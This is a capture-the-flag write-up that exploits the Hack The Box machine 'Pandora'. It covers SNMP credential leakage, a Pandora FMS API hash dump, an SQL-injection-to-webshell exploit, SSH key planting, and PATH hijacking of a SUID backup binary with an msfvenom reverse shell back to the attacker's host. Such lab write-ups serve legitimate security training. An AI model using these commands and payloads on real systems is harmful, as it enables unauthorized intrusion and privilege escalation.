---
title: HtB Writeup - Pandora
author: 6b6f6c6a61
date: 2022-05-26
category: HtB
layout: post
---

# HtB - Pandora

## Enumeration
### TCP Scan
I started by doing an nmap scan of the host:
```
sudo nmap -sS -p- 10.10.11.136    
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-29 16:15 EST
Nmap scan report for pandora.htb (10.10.11.136)
Host is up (0.035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.61 seconds
```

#### Content discovery

The initial scan showed only a webserver, so I started doing content discovery on the website, but this did not yield anything interesting.

### UDP Scan
Further enumeration showed, that snmp is open on port 161:

```
Nmap scan report for pandora.htb (10.10.11.136)
Host is up, received user-set (0.031s latency).
Scanned at 2022-01-30 05:23:34 EST for 327s
Not shown: 78 closed udp ports (port-unreach)
PORT      STATE         SERVICE      REASON              VERSION
7/udp     open|filtered echo         no-response
69/udp    open|filtered tftp         no-response
123/udp   open|filtered ntp          no-response
139/udp   open|filtered netbios-ssn  no-response
161/udp   open          snmp         udp-response ttl 63 SNMPv1 server; net-snmp SNMPv3 server (public)
[...]
```

## User
### SNMP
I used snmpwalk as follows and found credentials for ssh:

```
└─$ snmpwalk -v 2c -c public 10.10.11.136                                                                                                                                                                                             
[...]
iso.3.6.1.2.1.25.4.2.1.5.840 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
[...]
```

### Lateral movement to matt user
I took a quick look at the box and ran linpeas. My guess was, that i needed to get to the matt user to then go on to root. There was also the pandora software, which I did not really interact with until now and which the name seems to point to. I checked the file, that was called using the daniel user:
```
/usr/bin/host_check
```

In it I found a URL, that interacted with the Pandora application:
```
http://127.0.0.1/pandora_console/include/api.php?op=get&op2=all_agents&return_type=csv&other_mode=url_encode_separator_%7C&user=daniel&pass=HotelBabylon23
```

I started looking at the documentation and found, that I could find user info including password hashes using the following enpoint:
```
curl "http://127.0.0.1/pandora_console/include/api.php?op=get&op2=users&return_type=csv&other_mode=url_encode_separator_%7C&user=daniel&pass=HotelBabylon23"
daniel;Daniel;;;-1;76323c174bd49ffbbdedf678f6cc89a6;;1638793290;1623881514;daniel@pandora.htb;;0;en_GB;UTC;20;0;0;0;;Default;;0;0000-00-00 00:00:00;0000-00-00 00:00:00;0;0;basic;1;0;0;0;0;;-1;0;;30;0;;;
matt;Matt;;;-1;f655f807365b6dc602b31ab3d6d43acc;;1638796349;1623425334;matt@pandora.htb;;0;default;;20;0;0;0;;Default;;0;0000-00-00 00:00:00;0000-00-00 00:00:00;0;0;basic;0;0;0;0;0;;-1;0;;30;0;;;0
admin;Pandora Admin;;;-1;ad3f741b04bd5880fb32b54bc4f43d6a;Admin Pandora;1623956949;0;admin@pandora.htb;555-555-5555;1;default;;0;0;0;0;;Default;;0;2021-06-11 15:27:17;0000-00-00 00:00:00;0;0;advanced;0;0;0;0;0;;0;0;;30;0;;;0
```

To make this more readable we can also use json:

```
curl "http://127.0.0.1/pandora_console/include/api.php?op=get&op2=users&return_type=json&other_mode=url_encode_separator_%7C&user=daniel&pass=HotelBabylon23"
{"data":{"daniel":{"id_user":"daniel","fullname":"Daniel","firstname":"","lastname":"","middlename":"-1","password":"76323c174bd49ffbbdedf678f6cc89a6","comments":"","last_connect":"1638793290","registered":"1623881514","email":"daniel@pandora.htb","phone":"","is_admin":"0","language":"en_GB","timezone":"UTC","block_size":"20","id_skin":"0","disabled":"0","shortcut":"0","shortcut_data":"","section":"Default","data_section":"","force_change_pass":"0","last_pass_change":"0000-00-00 00:00:00","last_failed_login":"0000-00-00 00:00:00","failed_attempt":"0","login_blocked":"0","metaconsole_access":"basic","not_login":"1","metaconsole_agents_manager":"0","metaconsole_assigned_server":"0","metaconsole_access_node":"0","strict_acl":"0","id_filter":"","session_time":"-1","default_event_filter":"0","autorefresh_white_list":"","time_autorefresh":"30","default_custom_view":"0","ehorus_user_level_user":"","ehorus_user_level_pass":"","ehorus_user_level_enabled":""},"matt":{"id_user":"matt","fullname":"Matt","firstname":"","lastname":"","middlename":"-1","password":"f655f807365b6dc602b31ab3d6d43acc","comments":"","last_connect":"1638796349","registered":"1623425334","email":"matt@pandora.htb","phone":"","is_admin":"0","language":"default","timezone":"","block_size":"20","id_skin":"0","disabled":"0","shortcut":"0","shortcut_data":"","section":"Default","data_section":"","force_change_pass":"0","last_pass_change":"0000-00-00 00:00:00","last_failed_login":"0000-00-00 00:00:00","failed_attempt":"0","login_blocked":"0","metaconsole_access":"basic","not_login":"0","metaconsole_agents_manager":"0","metaconsole_assigned_server":"0","metaconsole_access_node":"0","strict_acl":"0","id_filter":"","session_time":"-1","default_event_filter":"0","autorefresh_white_list":"","time_autorefresh":"30","default_custom_view":"0","ehorus_user_level_user":"","ehorus_user_level_pass":"","ehorus_user_level_enabled":"0"},"admin":{"id_user":"admin","fullname":"Pandora Admin","firstname":"","lastname":"","middlename":"-1","password":"ad3f741b04bd5880fb32b54bc4f43d6a","comments":"Admin Pandora","last_connect":"1623956949","registered":"0","email":"admin@pandora.htb","phone":"555-555-5555","is_admin":"1","language":"default","timezone":"","block_size":"0","id_skin":"0","disabled":"0","shortcut":"0","shortcut_data":"","section":"Default","data_section":"","force_change_pass":"0","last_pass_change":"2021-06-11 15:27:17","last_failed_login":"0000-00-00 00:00:00","failed_attempt":"0","login_blocked":"0","metaconsole_access":"advanced","not_login":"0","metaconsole_agents_manager":"0","metaconsole_assigned_server":"0","metaconsole_access_node":"0","strict_acl":"0","id_filter":"","session_time":"0","default_event_filter":"0","autorefresh_white_list":"","time_autorefresh":"30","default_custom_view":"0","ehorus_user_level_user":"","ehorus_user_level_pass":"","ehorus_user_level_enabled":"0"}}}
```

While this was interesting I was not able to recover the passwords and gave this up as a dead end. It is also possible to retrieve the version of the installed software from the api:
```
curl "http://127.0.0.1/pandora_console/include/api.php?info=version"
Pandora FMS v7.0NG.742_FIX_PERL2020 - PC200103 MR34
```

I found the following script on github:
```
https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py
```

This script first uses an SQLi to get a session cookie for the admin user. After this it uses the retrieved session to upload a php webshell to server and gives us access to this webshell. Using this script I was able to get access to the box as matt:
```
daniel@pandora:/tmp$ python3 exploit.py 
usage: exploit.py [-h] -t TARGET [-f FILENAME]
exploit.py: error: the following arguments are required: -t/--target
daniel@pandora:/tmp$ python3 exploit.py -t 127.0.0.1:80 -f test.php
URL:  http://127.0.0.1:80/pandora_console
[+] Sending Injection Payload
[+] Requesting Session
[+] Admin Session Cookie : t2seioj9ch3uaaijvjgsjael4b
[+] Sending Payload 
[+] Respose : 200
[+] Pwned :)
[+] If you want manual Control : http://127.0.0.1:80/pandora_console/images/test.php?test=
CMD >
```

I retrieved the user flag at this point:
```
cat /home/matt/user.txt
98f84903449f019b763831f8e3e5dbf4
```

### Privilege escalation to root
Next I generated an ssh key and put it in the authorized file for matt to get a proper shell. Locally I used:
```
ssh-keygen -t rsa -f tmp 
chmod 600 tmp
```

I base64 encoded the public key and then wrote it as follows into the autorized_keys file:
```
echo "c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FEYndNZEE0OWVJNXkrT3ZydW1PTU40OFltUllFYUNTa0NCbTRtUE00VzBjMHpCZlM2UHNGYXArb2pieDZ5UlhCaGtWTGhpQ29FRit4bnhGOVZrK2hxOEVueUx3WGlYcWVYRXVmUWs3QzRNWStrSkdzaDlCUzhLd01wMkJST2R1RmJSaFVyVkppNVdmTnkva1dMVnV0ZG5xWHV1OHZSQmJlMmJDR3ZCUXdnS3YvSXBmK1EwNHZjSVhmbnlrZHpOL3V3VnJaQzlPOVIzNGpsZlQ5bXlJVHVYcUJQRmZxcHN5ZHZoK2J1dzFLc0RMelgzMk1kMDc2UjVPM2RGd2tXSndHZzYrNXlQNW14SWFtTGR2WGFaT3laL0FrSE5yMUx2a1lLZEVSYWN3Ui9iUno4TzBDcWlaWDRLbG5zN3BvZk45cWh3eE9Fdm1wRnJkV0FEdjlPUEk3NWF3Q1pZVnlpZ0JxMm5EMmppR3JEa2dLTWZUbGN3MFRhSVNMSHpOUVlCdjJ3ZGkrdXkrRW41dzFYU1Mzd0h0T2RHWEdFK3RKZklZOEd1N0wrUWlnd1FRSm5oenlVRENVVXd5ZmJaemlQKzIvSlpsL1JoS3BGSXdPOXIrcVhmLzI0OFZYSUZvdzcrOG45Z3Y0cmZFQUNOMmFBMUFuYk1pb1o5UWMweUNWWjJRRzg9IGthbGlAa2FsaQo=" | base64 -d > /home/matt/.ssh/authorized_keys
```

This was necessary because the webshell did some URL decoding on the `+` characters included in the key. Next I ran linpeas again. I saw the following file:

```
-rwsr-x--- 1 root matt 17K Dec  3 15:58 /usr/bin/pandora_backup (Unknown SUID binary)
```

The file contains a tar command without absolute path and is suid. Therefore path hijacking leads to privileged escalation here. I generated a reverse shell using msfvenom:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=1234 -f elf > tar 
```

I then uploaded it to the system and adjusted the permissions as well as the path variable. 

```
matt@pandora:~$ export PATH=$(pwd):$PATH
matt@pandora:~$ chmod +x tar
matt@pandora:~$ ls
tar  user.txt
```

After this I started a listener and executed the pandora_backup utitlity again:

```
matt@pandora:~$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
```

I got a root shell on my listener and retrieved the root flag:
``````
nc -lvp 1234    
listening on [any] 1234 ...
connect to [10.10.14.4] from pandora.htb [10.10.11.136] 55406
whoami
root
cd /root
ls
root.txt
cat root.txt
3345ffb5f35abc03990b087a826a80bc
```
